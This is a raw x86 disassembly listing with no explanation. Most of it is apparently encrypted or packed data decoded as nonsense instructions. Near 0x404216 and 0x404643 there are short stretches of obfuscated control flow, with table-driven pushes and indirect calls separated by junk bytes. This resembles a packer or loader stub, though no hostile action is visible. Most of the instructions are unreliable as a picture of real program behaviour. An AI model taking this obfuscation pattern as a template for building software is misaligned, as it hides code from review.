  40405f:	imul   ebx,edx,0xb15ee94b
  404065:	hlt    
  404066:	pop    esp
  404067:	fild   QWORD PTR [ebx+0x1c]
  40406a:	jecxz  0x403fec
  40406c:	fstp   st(0)
  40406e:	icebp  
  40406f:	inc    edx
  404070:	and    al,0xfb
  404072:	ret    0x8bfc
  404075:	mov    dh,0x58
  404077:	push   edi
  404078:	mul    DWORD PTR [esi]
  40407a:	mov    ebp,0xa2a63112
  40407f:	hlt    
  404080:	xchg   esi,eax
  404081:	addr16 inc esi
  404083:	jbe    0x404079
  404085:	aaa    
  404086:	inc    ebx
  404087:	sub    al,0x17
  404089:	shr    ecx,0x5c
  40408c:	gs xor al,al
  40408f:	test   eax,0x44fd4ad2
  404094:	or     BYTE PTR [edx],bh
  404096:	dec    eax
  404097:	cmp    dh,BYTE PTR [ebp-0x1b20a4a6]
  40409d:	pushf  
  40409e:	(bad)  
  40409f:	mov    ds:0x621939b9,al
  4040a4:	push   edi
  4040a5:	int    0x6c
  4040a7:	dec    esi
  4040a8:	pop    edi
  4040a9:	pop    ds
  4040aa:	(bad)  
  4040ac:	in     eax,dx
  4040ad:	lods   al,BYTE PTR ds:[esi]
  4040ae:	mov    ch,BYTE PTR [ecx]
  4040b0:	push   esp
  4040b1:	rcl    DWORD PTR [ecx+eax*8],1
  4040b4:	aad    0x27
  4040b6:	sub    edi,ebp
  4040b8:	outs   dx,DWORD PTR ds:[esi]
  4040b9:	lea    esi,[esi+eiz*4-0x10e74dd4]
  4040c0:	inc    edx
  4040c1:	pop    ebx
  4040c2:	pop    eax
  4040c3:	add    al,0x7
  4040c5:	in     al,0x61
  4040c7:	and    BYTE PTR [edx-0xdff3341],ah
  4040cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040ce:	loop   0x4040d0
  4040d0:	pop    ebx
  4040d1:	mov    ds,WORD PTR [edx]
  4040d3:	(bad)  
  4040d4:	mov    eax,ds:0xef7a60a6
  4040d9:	mov    DWORD PTR [esi+0x65],edx
  4040dc:	enter  0xf198,0x62
  4040e0:	jnp    0x4040c5
  4040e2:	jmp    0x1928a784
  4040e7:	sbb    esp,edi
  4040e9:	push   es
  4040ea:	into   
  4040eb:	ins    BYTE PTR es:[edi],dx
  4040ec:	outs   dx,DWORD PTR ds:[esi]
  4040ed:	push   DWORD PTR [edx+0x68]
  4040f0:	adc    al,0x9f
  4040f2:	(bad)  
  4040f3:	xor    al,0x98
  4040f5:	rcl    DWORD PTR [esi+0x30],1
  4040f8:	xor    dl,bh
  4040fa:	bound  ecx,QWORD PTR [esi+0x3f]
  4040fd:	push   edi
  4040fe:	lea    edx,[ebp+edi*2-0x5c]
  404102:	mov    al,0x8
  404104:	mov    ds:0x347fd4f0,eax
  404109:	cmp    ch,al
  40410b:	sbb    al,0xc2
  40410e:	jo     0x40409f
  404110:	push   ecx
  404111:	outs   dx,DWORD PTR ds:[esi]
  404112:	or     al,0xd8
  404114:	jle    0x404160
  404116:	xchg   esi,eax
  404117:	mov    al,0xe4
  404119:	loop   0x404198
  40411b:	lods   al,BYTE PTR ds:[esi]
  40411c:	popf   
  40411d:	cmp    eax,eax
  40411f:	adc    DWORD PTR [esi+0x6b9a6143],eax
  404125:	mov    BYTE PTR [esi],bh
  404127:	cmc    
  404128:	daa    
  404129:	mov    ebx,0x47c949c4
  40412e:	shl    BYTE PTR [esi+ebx*1-0x2bdeb960],0x13
  404136:	cmp    esi,DWORD PTR [ecx-0x65]
  404139:	dec    esi
  40413a:	pop    ds
  40413b:	xor    eax,0x95cd5b39
  404140:	cwde   
  404141:	push   ecx
  404142:	push   ss
  404143:	xor    bh,bh
  404145:	ret    
  404146:	pop    esp
  404147:	sti    
  404148:	or     BYTE PTR [ebx+0x52],cl
  40414b:	and    cl,BYTE PTR [esp+edx*8+0x8]
  40414f:	test   BYTE PTR [eax-0x137a0e0c],ah
  404155:	cli    
  404156:	and    DWORD PTR [eax+0x24],edi
  404159:	inc    esp
  40415a:	cdq    
  40415b:	inc    esi
  40415c:	in     al,0xee
  40415e:	push   esi
  40415f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404160:	stc    
  404161:	mov    DWORD PTR [edi+esi*1+0x39],ebp
  404165:	sti    
  404166:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404167:	shr    DWORD PTR [edi-0x4611aa5e],cl
  40416d:	fcom   st(5)
  40416f:	add    al,0xa
  404171:	arpl   WORD PTR [ecx-0x23],cx
  404174:	jne    0x40417b
  404176:	call   0xc57db563
  40417b:	xadd   BYTE PTR ds:0x8b89f291,ch
  404182:	or     ecx,ecx
  404184:	push   edx
  404185:	mov    bh,0x33
  404187:	sti    
  404188:	jnp    0x4041d0
  40418a:	sti    
  40418b:	nop
  40418c:	jns    0x404160
  40418e:	cs xchg edi,eax
  404190:	xlat   BYTE PTR ds:[ebx]
  404191:	xchg   ecx,eax
  404192:	repnz mov eax,ds:0x36e3cd09
  404198:	js     0x404172
  40419a:	(bad)  
  40419b:	into   
  40419c:	mov    edi,DWORD PTR [esi-0x2d]
  40419f:	and    al,0x66
  4041a1:	dec    edi
  4041a2:	xlat   BYTE PTR ds:[ebx]
  4041a3:	dec    edx
  4041a4:	out    dx,eax
  4041a5:	icebp  
  4041a6:	repnz dec esi
  4041a8:	xor    edi,0x3b
  4041ab:	and    BYTE PTR [edi-0x23fbd572],ah
  4041b1:	cmp    ebp,DWORD PTR [ecx+0x17]
  4041b4:	dec    DWORD PTR [edi]
  4041b6:	xor    ch,BYTE PTR [esi+eiz*2-0x32]
  4041ba:	(bad)  
  4041bb:	hlt    
  4041bc:	inc    edi
  4041bd:	mov    dl,0xd6
  4041bf:	(bad)  
  4041c0:	mov    dh,0x4b
  4041c2:	ret    0x1b4b
  4041c5:	pop    eax
  4041c6:	mov    esi,0x70246989
  4041cb:	or     eax,0xa7fccb5e
  4041d0:	popa   
  4041d1:	popa   
  4041d2:	inc    edx
  4041d3:	mov    ebp,0x44be0916
  4041d8:	or     BYTE PTR es:[eax+ebp*1],0xe5
  4041dd:	xchg   ebp,eax
  4041de:	ins    DWORD PTR es:[edi],dx
  4041df:	loope  0x40421b
  4041e1:	push   es
  4041e2:	jmp    0xe3a1:0xdf185308
  4041e9:	mov    esp,0xc00642f4
  4041ee:	repnz (bad) 
  4041f0:	or     al,0x37
  4041f2:	out    dx,eax
  4041f3:	cmp    ch,BYTE PTR [eax-0x22382cb8]
  4041f9:	push   edi
  4041fa:	shl    BYTE PTR [esi-0x24],cl
  4041fd:	xchg   esi,eax
  4041fe:	mov    dl,0x2
  404200:	adc    DWORD PTR [ebx-0x7c760503],ebx
  404206:	add    ch,BYTE PTR [ebp-0x18]
  404209:	and    BYTE PTR [eax+0x4b],0x72
  40420d:	inc    edx
  40420e:	loope  0x404197
  404210:	sar    esi,1
  404212:	or     bh,bh
  404214:	jne    0x4041fe
  404216:	mov    eax,ds:0x413c9a
  40421b:	mov    eax,DWORD PTR [eax]
  40421d:	push   DWORD PTR [eax]
  40421f:	lea    eax,ds:0x413cb6
  404225:	push   DWORD PTR [eax]
  404227:	lea    eax,ds:0x413a62
  40422d:	push   DWORD PTR [eax]
  40422f:	lea    eax,ds:0x413c96
  404235:	jmp    0x404643
  40423a:	out    0xed,eax
  40423c:	sahf   
  40423d:	(bad)  
  40423e:	mov    ah,0x55
  404240:	addr16 in eax,dx
  404242:	push   edi
  404243:	sub    DWORD PTR [bx+si-0x1f],0x1f
  404248:	jo     0x4041ca
  40424a:	aad    0x25
  40424c:	jle    0x4042cc
  40424e:	outs   dx,DWORD PTR ds:[esi]
  40424f:	jge    0x4042cf
  404251:	jle    0x404248
  404253:	fst    QWORD PTR [eax-0x6ecf0bb7]
  404259:	pop    edx
  40425a:	inc    edx
  40425b:	sbb    DWORD PTR [ecx-0x3f],esp
  40425e:	xor    DWORD PTR [ebx],edx
  404260:	mov    ds:0x10433bc6,al
  404265:	adc    dl,dl
  404267:	and    al,0x42
  404269:	aam    0x6e
  40426b:	das    
  40426c:	cmp    eax,0x559bea09
  404271:	fnsave ds:0xcf74d416
  404277:	cdq    
  404278:	imul   esi,DWORD PTR [esi-0x77],0x14
  40427c:	mov    edx,0x4f889b5a
  404281:	dec    edi
  404282:	or     eax,0x423da447
  404287:	scas   al,BYTE PTR es:[edi]
  404288:	add    dh,BYTE PTR [edi-0x59]
  40428b:	jnp    0x404263
  40428d:	add    al,BYTE PTR [ebx+0x7e994cb7]
  404293:	scas   al,BYTE PTR es:[edi]
  404294:	inc    ebx
  404295:	outs   dx,BYTE PTR ds:[esi]
  404296:	push   esp
  404297:	dec    esp
  404298:	outs   dx,BYTE PTR ds:[esi]
  404299:	xlat   BYTE PTR ds:[ebx]
  40429a:	push   edi
  40429b:	call   0x1e876a2e
  4042a0:	clc    
  4042a1:	into   
  4042a2:	adc    ecx,DWORD PTR [ecx]
  4042a4:	sub    bl,BYTE PTR [ecx+edi*1-0x251fad20]
  4042ab:	inc    esi
  4042ac:	sar    ah,1
  4042ae:	pop    ds
  4042af:	mov    dl,0xe3
  4042b1:	mov    ah,0x6c
  4042b3:	push   ds
  4042b4:	push   es
  4042b5:	ret    
  4042b6:	fisttp WORD PTR [eax+0x5c98ab76]
  4042bc:	addr16 ds jbe 0x404333
  4042c0:	add    al,0x7
  4042c2:	add    DWORD PTR [edx-0x29663b58],esi
  4042c8:	stc    
  4042c9:	dec    ecx
  4042ca:	sub    BYTE PTR [ebp-0x4480724],bl
  4042d0:	cmp    DWORD PTR [ebp-0x7d],edx
  4042d3:	and    al,0xc5
  4042d5:	inc    edi
  4042d6:	push   ecx
  4042d7:	push   edi
  4042d8:	out    0xe0,al
  4042da:	in     al,dx
  4042db:	push   cs
  4042dc:	or     eax,0x5df83ab2
  4042e1:	ror    BYTE PTR [esp+ecx*1-0x2c],0xc1
  4042e6:	mov    esi,ebx
  4042e8:	cmc    
  4042e9:	je     0x4042a0
  4042eb:	jnp    0x404276
  4042ed:	sub    eax,0xa7e5aee4
  4042f2:	push   edx
  4042f3:	dec    esi
  4042f4:	es test eax,0x2284edb6
  4042fb:	jno    0x4042fb
  4042fd:	call   0x384ad74e
  404302:	cmc    
  404303:	es jno 0x404357
  404306:	xchg   esp,eax
  404307:	cwde   
  404308:	les    esi,FWORD PTR [ebx+0x48]
  40430b:	gs (bad) 
  40430d:	cld    
  40430e:	test   al,0xc7
  404310:	das    
  404311:	adc    DWORD PTR [edx+eiz*8],0xffffff98
  404315:	in     eax,dx
  404316:	mov    BYTE PTR [esi-0x32],al
  404319:	pop    ds
  40431a:	sub    ch,BYTE PTR [edx+0x1809d114]
  404320:	cs rcr esi,0xd9
  404324:	dec    esi
  404325:	sub    ch,al
  404327:	(bad)  
  404329:	iret   
  40432a:	mov    bl,0xb9
  40432c:	sti    
  40432d:	push   ds
  40432e:	mov    BYTE PTR [edi-0x3b],dh
  404331:	jns    0x404377
  404333:	outs   dx,BYTE PTR ds:[esi]
  404334:	fdiv   st,st(5)
  404336:	dec    edi
  404337:	stos   BYTE PTR es:[edi],al
  404338:	add    bh,BYTE PTR [ebx]
  40433a:	jns    0x40430e
  40433c:	jmp    0x958cc877
  404341:	mov    ?,esp
  404343:	pop    esp
  404344:	int3   
  404345:	cdq    
  404346:	repz and eax,0xec3cc8d
  40434c:	loopne 0x4043c8
  40434e:	cmp    edx,ebp
  404350:	jge    0x404323
  404352:	cmp    BYTE PTR [esi],al
  404354:	mov    al,ds:0x8ade1cde
  404359:	aam    0xbf
  40435b:	mov    bl,0xff
  40435d:	jnp    0x404302
  40435f:	push   eax
  404360:	imul   ebp,eax,0x26
  404363:	inc    ecx
  404364:	pop    ecx
  404365:	das    
  404366:	push   0xfffffff3
  404368:	mov    ebx,0x2b78822e
  40436d:	add    DWORD PTR [edx-0xd],edx
  404370:	fs ja  0x40439f
  404373:	push   cs
  404374:	xchg   esp,eax
  404375:	dec    edx
  404376:	inc    eax
  404377:	dec    edi
  404378:	lock jo 0x4043c0
  40437b:	(bad)  [edx]
  40437d:	sbb    eax,0x7daec12b
  404382:	fidivr WORD PTR [eax]
  404384:	daa    
  404385:	sbb    BYTE PTR [ebx-0x52],bl
  404388:	dec    ebp
  404389:	inc    esi
  40438a:	ret    0x56c2
  40438d:	adc    eax,0xbda6c529
  404392:	inc    esi
  404393:	out    0xb,eax
  404395:	jno    0x404368
  404397:	mov    DWORD PTR [eax+0x4b],ebp
  40439a:	push   ebp
  40439b:	test   al,0xce
  40439d:	ds jge 0x404339
  4043a0:	pop    ebp
  4043a2:	in     al,0xd8
  4043a4:	gs js  0x40440e
  4043a7:	add    eax,0xf889f0f
  4043ac:	add    DWORD PTR [ebp+eiz*8+0x1bdc5a40],ecx
  4043b3:	add    BYTE PTR [eax],cl
  4043b5:	cmp    al,0x3
  4043b7:	inc    edi
  4043b8:	lea    eax,[edx+ebp*4-0x3d]
  4043bc:	mov    al,ds:0xbd6e74c
  4043c1:	imul   eax,edx,0x53ae8797
  4043c7:	call   0x5bdf:0x56eb27d
  4043ce:	retf   0xb407
  4043d1:	or     eax,0x33a8a343
  4043d6:	(bad)  
  4043d7:	js     0x4043f7
  4043d9:	(bad)  
  4043da:	cwde   
  4043db:	xchg   BYTE PTR [ecx+0x33],bh
  4043de:	sti    
  4043df:	xchg   ecx,eax
  4043e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043e1:	sub    BYTE PTR [ecx-0x582cea39],bl
  4043e7:	rol    BYTE PTR [ebx+0x6f],0x59
  4043eb:	add    edx,DWORD PTR [eax-0x115f9eff]
  4043f1:	(bad)
  4043f4:	outs   dx,DWORD PTR ds:[esi]
  4043f5:	imul   edi,edi,0x41
  4043f8:	jp     0x404399
  4043fa:	adc    al,0x36
  4043fc:	mov    bl,0x55
  4043fe:	inc    edi
  4043ff:	sub    BYTE PTR [edx+0x1dbeb426],al
  404405:	lea    edx,[edi-0x3a]
  404408:	or     eax,0x2265c9a7
  40440d:	or     BYTE PTR [eax-0x5b6a142],bh
  404413:	imul   edx,DWORD PTR [esi-0x37009754],0x5241116a
  40441d:	push   ds
  40441e:	mov    ds:0x9b73742f,eax
  404423:	stos   BYTE PTR es:[edi],al
  404424:	push   0x8f04f62c
  404429:	aad    0x2c
  40442b:	add    BYTE PTR [eax-0x1d9eea98],cl
  404431:	jg     0x404464
  404433:	mov    bl,0x2d
  404435:	xor    al,0xff
  404437:	xchg   esp,eax
  404438:	dec    BYTE PTR [edx+0x2e]
  40443b:	out    dx,eax
  40443c:	pop    ss
  40443d:	mov    bh,0x48
  40443f:	(bad)  
  404440:	sahf   
  404441:	cmp    BYTE PTR [edx+0x5f8baea0],dl
  404447:	xor    eax,0x9e0867df
  40444c:	leave  
  40444d:	mov    dl,0x69
  40444f:	rol    BYTE PTR [esi+ebp*4],cl
  404452:	adc    al,0x7f
  404454:	push   ds
  404455:	pop    ss
  404456:	and    eax,esi
  404458:	clc    
  404459:	repz iret 
  40445b:	jmp    0x79e4:0x261fcaa7
  404462:	inc    ecx
  404463:	push   cs
  404464:	(bad)  
  404465:	mov    esi,0xb56b5eb6
  40446a:	loop   0x4044d6
  40446c:	push   ss
  40446d:	mov    ch,0x4a
  40446f:	sub    BYTE PTR [eax],dh
  404471:	xchg   BYTE PTR [eax-0x3f],cl
  404474:	jge    0x40444a
  404476:	xlat   BYTE PTR ds:[ebx]
  404477:	fisubr WORD PTR [esi-0x80]
  40447a:	push   es
  40447b:	ror    DWORD PTR [edi+0x76],0x91
  40447f:	bound  edi,QWORD PTR [esp+ecx*4]
  404482:	outs   dx,BYTE PTR ds:[esi]
  404483:	clc    
  404484:	fs out 0x2d,eax
  404487:	dec    edi
  404488:	push   ebx
  404489:	inc    edx
  40448a:	dec    esi
  40448b:	shr    dl,cl
  40448d:	inc    esp
  40448e:	xchg   ecx,eax
  40448f:	sbb    al,0xf8
  404491:	jnp    0x404487
  404493:	popa   
  404494:	(bad)
  404498:	loope  0x4044e1
  40449a:	ja     0x404472
  40449c:	xor    al,0x58
  40449e:	cwde   
  40449f:	mov    ah,0x98
  4044a1:	repz fsub DWORD PTR [eax]
  4044a4:	ret    0x5a3b
  4044a7:	popf   
  4044a8:	mov    ebx,0xfb4d2c44
  4044ad:	scas   eax,DWORD PTR es:[edi]
  4044ae:	push   edx
  4044af:	call   0xbed6:0x6183a77a
  4044b6:	mov    ds:0xc63754f5,al
  4044bb:	adc    bl,BYTE PTR [esi+0x2d]
  4044be:	sub    eax,0xc85e89d4
  4044c3:	jecxz  0x404538
  4044c5:	cld    
  4044c6:	aam    0xa9
  4044c8:	cld    
  4044c9:	out    dx,al
  4044ca:	add    eax,DWORD PTR cs:[ebx-0x65db4310]
  4044d1:	je     0x404492
  4044d3:	sub    DWORD PTR [eax+0x559c70ed],eax
  4044d9:	sbb    eax,0x36
  4044dc:	mov    ecx,0xaf9470aa
  4044e1:	lds    ebp,FWORD PTR [edx+0x33840ab9]
  4044e7:	add    ebp,ebp
  4044e9:	mov    eax,cs:0x7b211ccd
  4044ef:	dec    ebp
  4044f0:	cld    
  4044f1:	mov    al,ds:0xef498a40
  4044f6:	and    edi,DWORD PTR [esi]
  4044f8:	aad    0xae
  4044fa:	mov    eax,0xa2a303bc
  4044ff:	mov    dh,0x28
  404501:	fnstsw WORD PTR [esi-0x4682deed]
  404507:	es pop ds
  404509:	mov    eax,gs:0xb511ddec
  40450f:	neg    DWORD PTR [edi]
  404511:	std    
  404512:	or     BYTE PTR [eax+eax*4],ch
  404515:	ja     0x4044bc
  404517:	pop    edi
  404518:	stc    
  404519:	cs cld 
  40451b:	jge    0x404572
  40451d:	test   BYTE PTR [eax+esi*1-0x54],bl
  404521:	add    DWORD PTR [edx+0x64],ebp
  404524:	pop    esi
  404525:	pop    esi
  404526:	xor    al,0x79
  404528:	or     eax,0xe9ca5a1d
  40452d:	mov    ebx,0xa6eebdeb
  404532:	mov    ds:0xd5a2e40a,eax
  404537:	add    esi,DWORD PTR [eax-0x7cf372cf]
  40453d:	popa   
  40453e:	mov    BYTE PTR [ebx],cl
  404540:	div    BYTE PTR [esi-0x68abef99]
  404546:	lods   al,BYTE PTR ds:[esi]
  404547:	out    0xf6,al
  404549:	jne    0x404572
  40454b:	test   BYTE PTR ds:0xfe33ce6c,ch
  404551:	int3   
  404552:	mov    WORD PTR [esi+eiz*8-0x6c],ds
  404556:	test   al,0xb7
  404558:	push   eax
  404559:	sub    eax,0xe1022be2
  40455e:	mov    ecx,0x6896c608
  404563:	push   esi
  404564:	jo     0x40455e
  404566:	dec    DWORD PTR [ecx-0x6da33d2d]
  40456c:	cmp    eax,0x117ab0e3
  404571:	push   0x6d
  404573:	jb     0x4045f4
  404575:	jmp    0x56cb1ec8
  40457a:	inc    esp
  40457b:	xchg   esp,eax
  40457c:	and    DWORD PTR [ebp*2+0x2b20e22a],esi
  404583:	add    DWORD PTR [ebx],esp
  404585:	mov    ebp,0x62c23181
  40458a:	mov    esi,0xce258f36
  40458f:	in     eax,dx
  404590:	jp     0x404571
  404592:	push   ebp
  404593:	in     al,dx
  404594:	jno    0x40453b
  404596:	les    ebx,FWORD PTR [edx+0x3c7cbe07]
  40459c:	popf   
  40459d:	scas   al,BYTE PTR es:[edi]
  40459e:	jle    0x4045dd
  4045a0:	repnz and al,0xde
  4045a3:	fcom   QWORD PTR [ebx+0x8655422]
  4045a9:	inc    esi
  4045aa:	js     0x404606
  4045ac:	retf   
  4045ad:	shr    BYTE PTR [ecx],cl
  4045af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045b0:	sbb    eax,0x60c0f7f4
  4045b5:	fst    QWORD PTR [ebp-0x62]
  4045b8:	es int3 
  4045ba:	out    0x4a,al
  4045bc:	dec    ecx
  4045bd:	xchg   edi,eax
  4045be:	mov    ds:0x8f194c3c,al
  4045c3:	push   edi
  4045c4:	mov    ebx,0xa10417e
  4045c9:	scas   al,BYTE PTR es:[edi]
  4045ca:	xor    al,0x29
  4045cc:	dec    eax
  4045cd:	and    edi,DWORD PTR [ecx+0x12]
  4045d0:	add    al,0x80
  4045d2:	ret    
  4045d3:	jecxz  0x4045af
  4045d5:	inc    edi
  4045d6:	pop    esp
  4045d7:	in     al,0xe3
  4045d9:	(bad)  
  4045da:	sbb    bl,cl
  4045dc:	repnz inc ecx
  4045de:	pop    edi
  4045df:	push   edi
  4045e0:	inc    edi
  4045e1:	in     al,0xb8
  4045e3:	lods   al,BYTE PTR ds:[esi]
  4045e4:	mov    esp,0xd576eb52
  4045e9:	cli    
  4045ea:	push   edi
  4045eb:	mov    ebx,0xa1dd81cb
  4045f0:	ficomp WORD PTR [edx]
  4045f2:	inc    esp
  4045f3:	dec    ebp
  4045f4:	sahf   
  4045f5:	adc    BYTE PTR [esi],ah
  4045f7:	xchg   edi,eax
  4045f8:	lock int3 
  4045fa:	dec    ecx
  4045fb:	jno    0x4045ed
  4045fd:	outs   dx,BYTE PTR ds:[esi]
  4045fe:	test   DWORD PTR [eax-0x1c],esp
  404601:	sbb    al,0xb4
  404603:	cmc    
  404604:	push   esp
  404605:	addr16 in eax,dx
  404607:	jp     0x404619
  404609:	xchg   DWORD PTR [ebp-0x12],eax
  40460c:	inc    ebx
  40460d:	stos   BYTE PTR es:[edi],al
  40460e:	mov    edi,0xaa854499
  404613:	ret    
  404614:	or     al,0x3e
  404616:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404617:	test   al,0x96
  404619:	and    DWORD PTR [esi],esp
  40461b:	ja     0x404656
  40461d:	xchg   BYTE PTR ds:0xc5bf77ac,ah
  404623:	(bad)  
  404624:	cmp    BYTE PTR [ecx-0x40],dh
  404627:	mov    BYTE PTR [ecx-0x41aabb3],dh
  40462d:	scas   al,BYTE PTR es:[edi]
  40462e:	pop    ss
  40462f:	sub    al,0xcb
  404631:	scas   al,BYTE PTR es:[edi]
  404632:	mov    edx,0x62295bb3
  404637:	mov    dh,0xb7
  40463a:	jmp    0xe422:0xebee169b
  404641:	cmp    al,0xff
  404643:	push   DWORD PTR [eax]
  404645:	lea    eax,ds:0x413dc2
  40464b:	push   DWORD PTR [eax]
  40464d:	xchg   ebx,edx
  40464f:	inc    ebx
  404650:	inc    ebx
  404651:	push   ebx
  404652:	pop    eax
  404653:	call   DWORD PTR [eax-0x2]
  404656:	mov    eax,DWORD PTR [ebp-0x38]
  404659:	mov    ecx,DWORD PTR ds:0x413c5a
  40465f:	add    DWORD PTR [eax],ecx
  404661:	jmp    0x404a6f
  404666:	xor    DWORD PTR ds:0xb112a30a,ebx
  40466c:	mov    cl,0xad
  40466e:	jne    0x404697
  404670:	xor    eax,0x7ce24e3
  404675:	mov    dl,al
  404677:	and    DWORD PTR [esi+0x7e],edi
  40467a:	outs   dx,DWORD PTR ds:[esi]
  40467b:	jge    0x4046fb
  40467d:	jle    0x404668
  40467f:	fs push esi
  404681:	(bad)  
  404682:	(bad)  
  404684:	leave  
  404685:	(bad)  
  404686:	div    edx
  404688:	jle    0x404644
  40468a:	fwait
  40468b:	cmp    dh,BYTE PTR [edi-0x77]
  40468e:	addr16 int3 
  404690:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404691:	pop    es
  404692:	bound  edx,QWORD PTR [eax+eax*1+0x77a2b9dd]
  404699:	adc    esp,DWORD PTR [eax-0x577dcf0a]
  40469f:	cmc    
  4046a0:	push   ecx
  4046a1:	pop    edx
  4046a2:	fnstenv [esi-0x650a6daf]
  4046a8:	mov    esp,0xac3c6141
  4046ad:	mov    DWORD PTR [ebp-0x650689ef],ebp
  4046b3:	push   eax
  4046b4:	xor    ah,ah
  4046b6:	fwait
  4046b7:	push   cs
  4046b8:	push   es
  4046b9:	(bad)
  4046bd:	mov    BYTE PTR [ebx],dh
  4046bf:	neg    bl
  4046c1:	dec    ebx
  4046c2:	push   0xfffffff2
  4046c4:	push   es
  4046c5:	std    
  4046c6:	lahf   
  4046c7:	hlt    
  4046c8:	enter  0xcc5b,0x66
  4046cc:	xchg   ecx,eax
  4046cd:	sub    ecx,ebx
  4046cf:	and    esi,edi
  4046d1:	in     eax,0x80
  4046d3:	pushf  
  4046d4:	dec    ebp
  4046d5:	popf   
  4046d6:	xor    edi,DWORD PTR [edx+0x2c8b939]
  4046dc:	jnp    0x4046de
  4046de:	add    BYTE PTR [ecx+0x1d4b1734],ch
  4046e4:	mov    dl,0x4f
  4046e6:	cmp    DWORD PTR [eax],edx
  4046e8:	xchg   BYTE PTR [esi+0x68],bl
  4046eb:	js     0x40476b
  4046ed:	outs   dx,DWORD PTR ds:[esi]
  4046ee:	neg    BYTE PTR [ecx]
  4046f0:	pop    ecx
  4046f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046f2:	mov    edx,0xc799f70e
  4046f7:	adc    DWORD PTR [ebp+0x76],edx
  4046fa:	int    0x35
  4046fc:	jns    0x404756
  4046fe:	sbb    eax,0xeb2285e5
  404703:	ja     0x40474e
  404705:	xchg   esp,eax
  404706:	stos   DWORD PTR es:[edi],eax
  404707:	pop    edx
  404708:	inc    esp
  404709:	fwait
  40470a:	mov    BYTE PTR [edi-0x8],dh
  40470d:	cmp    bh,BYTE PTR [ebx+ecx*2]
  404710:	dec    edx
  404712:	bound  eax,QWORD PTR ds:0xc8d872c4
  404718:	mov    ch,0xd5
  40471a:	mov    dl,0xd6
  40471c:	aam    0x8
  40471e:	loopne 0x404748
  404720:	pusha  
  404721:	test   eax,0x824bbc71
  404726:	test   al,0x77
  404728:	xchg   ebx,eax
  404729:	xchg   BYTE PTR [eax],cl
  40472b:	daa    
  40472c:	in     al,dx
  40472d:	sub    ebx,DWORD PTR [esi-0x41]
  404730:	aas    
  404731:	frstor [esi]
  404733:	dec    ebp
  404734:	pop    esp
  404735:	pop    eax
  404736:	rol    BYTE PTR [edi+0x2e],1
  404739:	add    ecx,DWORD PTR [ebx-0x25]
  40473c:	pushf  
  40473d:	imul   edx,DWORD PTR [edi-0x1284e897],0xffffff96
  404744:	sub    eax,0xf322d419
  404749:	add    bl,BYTE PTR [edi]
  40474b:	ja     0x4046f6
  40474d:	xor    eax,0xceae13a4
  404752:	xor    al,0x28
  404754:	aaa    
  404755:	sbb    eax,0x2607e15c
  40475a:	push   edi
  40475b:	sub    DWORD PTR [edx],0x3beebaa8
  404761:	mov    edx,0x1324ec97
  404766:	out    dx,eax
  404767:	sbb    al,0xa9
  404769:	jmp    0x1337:0xd06430f2
  404770:	cmp    BYTE PTR [ebp+0x4df42a55],0x6d
  404777:	mov    dl,0x5
  404779:	mov    esi,es
  40477b:	push   es
  40477c:	jnp    0x404763
  40477e:	jmp    0x404726
  404780:	mov    ch,0x53
  404782:	call   DWORD PTR [esi+edx*4-0x5154f853]
  404789:	adc    edx,DWORD PTR [ebp-0x4]
  40478c:	shl    DWORD PTR [edx-0x21c34700],cl
  404792:	lods   al,BYTE PTR ds:[esi]
  404793:	inc    esi
  404794:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404795:	and    bl,BYTE PTR [ebp+0x70]
  404798:	push   ss
  404799:	push   ebp
  40479a:	and    edx,DWORD PTR [edx+ecx*4-0x2d210d4d]
  4047a1:	neg    DWORD PTR [ebx]
  4047a3:	push   esp
  4047a4:	outs   dx,BYTE PTR ds:[esi]
  4047a5:	in     eax,dx
  4047a6:	add    eax,0xd53725a9
  4047ab:	aaa    
  4047ac:	mov    dh,0xa5
  4047ae:	add    DWORD PTR [eax],esp
  4047b0:	sbb    ah,ch
  4047b2:	pusha  
  4047b3:	add    dh,BYTE PTR ds:0x47f2f13f
  4047b9:	cli    
  4047ba:	addr16 push ds
  4047bc:	and    al,0xa
  4047be:	in     al,0xa2
  4047c0:	ins    BYTE PTR es:[edi],dx
  4047c1:	popf   
  4047c2:	pusha  
  4047c3:	mov    bl,0xbe
  4047c5:	(bad)  
  4047c6:	or     eax,0x2a9c91b5
  4047cb:	sub    al,0x83
  4047cd:	das    
  4047ce:	adc    BYTE PTR ds:0x65024b4d,ah
  4047d4:	cmc    
  4047d5:	push   0xffffff91
  4047d7:	inc    edi
  4047d8:	test   eax,0xa02d67a8
  4047dd:	and    BYTE PTR ds:0x18599105,al
  4047e3:	cld    
  4047e4:	push   cs
  4047e5:	adc    DWORD PTR [ebp-0x42],0x7d83129a
  4047ec:	push   cs
  4047ed:	mov    edx,0xa483984d
  4047f2:	jmp    0xc837:0xfd621af0
  4047f9:	dec    esi
  4047fa:	push   ebx
  4047fb:	call   0x2ef5:0x39aa5b8f
  404802:	push   esp
  404803:	scas   eax,DWORD PTR es:[edi]
  404804:	and    DWORD PTR [ebp-0x260fe35b],edx
  40480a:	dec    edx
  40480b:	(bad)  
  40480c:	mov    bl,0xad
  40480e:	call   0xf09:0xf4f3036c
  404815:	aas    
  404816:	jo     0x4047e8
  404818:	jg     0x404838
  40481a:	js     0x404838
  40481c:	mov    bh,0x1d
  40481e:	sub    BYTE PTR [edx-0x5f],ah
  404821:	mov    eax,0x71a5a2b2
  404826:	jb     0x404857
  404828:	fidiv  DWORD PTR [eax+0x166b46af]
  40482e:	jl     0x404811
  404830:	push   ds
  404831:	jne    0x404831
  404833:	shr    BYTE PTR cs:0x5d612cb3,1
  40483a:	lods   al,BYTE PTR ds:[esi]
  40483b:	jns    0x4047e6
  40483d:	and    BYTE PTR [esi+0xe],dl
  404840:	out    0x8,al
  404842:	add    DWORD PTR [edi-0x56cb6189],ebx
  404848:	push   ecx
  404849:	hlt    
  40484a:	loopne 0x404836
  40484c:	inc    ebp
  40484d:	fild   DWORD PTR [esi]
  40484f:	or     DWORD PTR [ebp-0x226b6a72],0xffffff89
  404856:	int3   
  404857:	jo     0x4048cd
  404859:	cwde   
  40485a:	fwait
